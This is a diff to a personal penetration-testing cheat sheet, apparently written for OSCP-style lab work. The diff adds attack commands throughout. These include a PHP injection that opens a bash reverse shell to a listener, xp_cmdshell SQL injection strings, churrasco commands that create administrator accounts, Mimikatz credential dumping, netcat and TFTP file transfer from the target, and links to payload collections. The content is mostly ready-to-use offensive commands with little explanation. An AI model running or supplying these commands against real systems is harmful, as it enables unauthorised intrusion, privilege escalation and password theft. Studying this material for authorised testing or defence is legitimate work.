@@ -9,6 +9,16 @@ Active Directory & Domain Controllers
 
 - http://web.archive.org/web/20160417135414/http://www.slaughterjames.com/blog/2012/10/30/hacking-a-domain-controller-part-2-easy-pwnage.html
 
+BOF (WIP)
+----------------
+(Bad Characters: 0x00, 0x0A)
+- Fuzzing
+- Finding eip position
+- Finding bad chars
+- Locating jmp esp
+- Generating payload with msfvenom
+- Getting reverse shell with netcat
+
 DNS - Zone Transfers
 ----------------
 host -t axfr test.local 10.10.10.10
@@ -17,22 +27,47 @@ host -l test.local 10.10.10.10
 
 File Transfers
 ----------------
-Wget Transfer
+#Wget Transfer
 How to retrieve file(s) from host (inside a reverse shell)
 
 	1. Place file you want transferred in /var/www/html/
 	2. # service apache2 start
 	3. # wget http://10.10.10/pspy64 <- for single file
   	4. # wget -r http://10.10.10.10/pspy64/ <- for folder
+	
+#TFTP Transfer
+(How to transfer from Kali to Windows)
+Using MSF. Start MSF before starting these steps:
 
-MSSQL
+	1. use auxiliary/server/tftp
+	2. set TFTPROOT /usr/share/mimikatz/Win32/
+	3. run
+  	4. tftp -i 10.10.10.10 GET mimikatz.exe
+
+#NC Transfer
+(How to transfer from Windows to Kali)
+Windows
+nc -nv 10.10.10.10 4444 < file.txt
+Kali
+nc -nlvp 4444 > file.txt
+
+LFI / RFI
+----------------
+- <?php echo shell_exec(whoami);?>
+- <?phpexec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10/1234 0>&1'");
+
+MSSQL / SQLi
 ----------------
 - EXEC master..xp_cmdshell 'whoami';
 - meh' exec master..xp_cmdshell 'whoami' --
+- https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md
 
-Payloads
+Payload Generation
 ----------------
+- https://netsec.ws/?p=331
+- http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/
 - https://www.offensive-security.com/metasploit-unleashed/payloads/
+- https://github.com/swisskyrepo/PayloadsAllTheThings
 - non staged = netcat
 - staged = multi/handler
 
@@ -52,47 +87,56 @@ Priv Esc - Linux
 
 Priv Esc - Windows
 ----------------
+ - http://www.fuzzysecurity.com/tutorials/16.html
+ - https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
+ - https://github.com/M4ximuss/Powerless
+ - https://github.com/sagishahar/lpeworkshop
  - c:\Inetpub>churrasco -d "net user /add <username> <password>"
  - c:\Inetpub>churrasco -d "net localgroup administrators <username> /add"
  - c:\Inetpub>churrasco -d "NET LOCALGROUP "Remote Desktop Users" <username> /ADD"
 
 Post Exploitation
 ----------------
-- Mimikatz.exe (run it)
-
-- privilege::debug
-
-- sekurlsa::logonpasswords
+1. Mimikatz.exe (run it)
+2. privilege::debug
+3. sekurlsa::logonpasswords
 
 Port Scanning
 ----------------
-reconnoitre -t 10.10.10.10 -o . --services --quick --hostnames
+#TCP
+- reconnoitre -t 10.10.10.10 -o . --services --quick --hostnames
+- nmap -sT -p 22,80,110 -A 
+- nmap -p- -iL ips.txt > AllTCPPorts.txt 
 
-nmap -sT -sU -p- --min-rate 10000
-nmap -sT -sU -p <open ports seperated by ,'s> -A
-obviously drop -sU if no UDP ports are open
-- TCP
-nmap -p- -iL ips.txt > AllTCPPorts.txt 
- 
-- UDP (can take hours so maybe netstat is a better alternative)
-nmap -p- -sU -iL ips.txt > udp.txt 
-nmap -sU -sV -iL ips.txt > alludpports.txt 
- 
-- SNMP
+#UDP (can take hours so maybe netstat is a better alternative)
+- nmap -sT -sU -p 22,80,110 -A 
+- nmap -sT -sU -p- --min-rate 10000
+- nmap -p- -sU -iL ips.txt > udp.txt 
+- nmap -sU -sV -iL ips.txt > alludpports.txt 
+
+#SNMP
 nmap -p161 -sU -iL ips.txt > udp.txt  (cmd could be wrong, double check)
- 
-- SSH
+
+#SSH
 nmap --script ssh2-enum-algos -iL ips.txt > SSH.txt 
- 
-- SSL
+
+#SSL
 nmap -v -v  --script ssl-cert,ssl-enum-ciphers,ssl-heartbleed,ssl-poodle,sslv2 -iL ips.txt > SSLScan.txt 
 
 Pivoting
 ----------------
-sshuttle -r user@10.10.10.10 10.1.1.0/24
+- sshuttle -r user@10.10.10.10 10.1.1.0/24
+
+Remote Desktop
+----------------
+rdesktop -u user -p password 10.10.10.10 -g 85% -r disk:share=/root/
 
 Reverse Shells
 ----------------
+#Linux
+- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+- https://awansec.com/reverse-shell.html
+
 #Windows
 - https://github.com/Dhayalanb/windows-php-reverse-shell
 
@@ -135,21 +179,25 @@ Show listening ports
 
 SMB - Impacket
 ----------------
-- Impacket's PSEXEC
+- Impacket's PSEXEC (After creating a remote port fwd)
 /usr/share/doc/python-impacket/examples/psexec.py user@10.10.10.10
 
 Password: (password)
 
 [*] Trying protocol 445/SMB...
 
-- Impacket's SMBServer
-cd /usr/share/windows-binaries
-python /usr/share/doc/python-impacket/examples/smbserver.py a .
+- Impacket's SMBServer (For File Trasnfer)
+1. cd /usr/share/windows-binaries
+2. python /usr/share/doc/python-impacket/examples/smbserver.py a .
+3. \\10.10.10.10\a\mimikatz.exe
 
 SMTP Enumeration
 ----------------
 https://github.com/s0wr0b1ndef/OSCP-note/blob/master/ENUMERATION/SMTP/smtp_commands.txt
 
+VMware (not going full screen)
+----------------
+- systemctl restart open-vm-tools.service
 
 Web Shells
 ----------------
@@ -163,11 +211,13 @@ WordPress
 Windows Framework / Powershell
 ----------------
 - https://github.com/samratashok/nishang
-- https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
 - https://github.com/rasta-mouse/Sherlock
 
 Windows Post Exploitation Commands
 ----------------
+- WMIC USERACCOUNT LIST BRIEF
 - net user
+- net localgroup Users
+- net localgroup Administrators
 - net user USERNAME NEWPASS
 - net user "USER NAME" NEWPASS
